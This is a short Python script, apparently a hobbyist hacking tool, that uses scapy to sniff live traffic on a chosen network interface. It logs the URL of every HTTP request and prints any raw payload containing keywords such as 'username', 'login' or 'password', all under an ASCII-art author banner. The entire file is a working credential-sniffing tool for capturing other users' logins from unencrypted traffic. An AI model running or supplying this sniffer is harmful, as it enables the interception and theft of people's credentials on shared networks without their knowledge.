import scapy.all as scapy
from scapy.layers import http
from colorama import Fore

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 21")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet[scapy.Raw].load)
        # print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP Request >> {url}")

        if packet.haslayer(scapy.Raw):
            keyword = ["email", "username", "user", "login", "password", "pass"]
            load = packet[scapy.Raw].load
            for keywords in keyword:
                if keywords.encode() in load:
                    print(Fore.GREEN + f"\n\n [+] Username/Password >> {load}")
                    break

print(r"""
    _______                          ______________       ________ 
___    |________________________ ___  /_____  /____  ____  __ \
__  /| |_  ___/  _ \_  __ \  __ `/_  /_  __  /__  / / /_  /_/ /
_  ___ |  /   /  __/  / / / /_/ /_  / / /_/ / _  /_/ /_  ____/ 
/_/  |_/_/    \___//_/ /_/\__,_/ /_/  \__,_/  _\__, / /_/      
                                              /____/""")
print("=====================================")
print("######    AUTHOR    #######")
print("*******    @RENALDY   ******")
print("=====================================")
print("\n\n\n")


intf = input(Fore.WHITE + "Masukan Interface wlan0/eth0: ")
sniff(intf)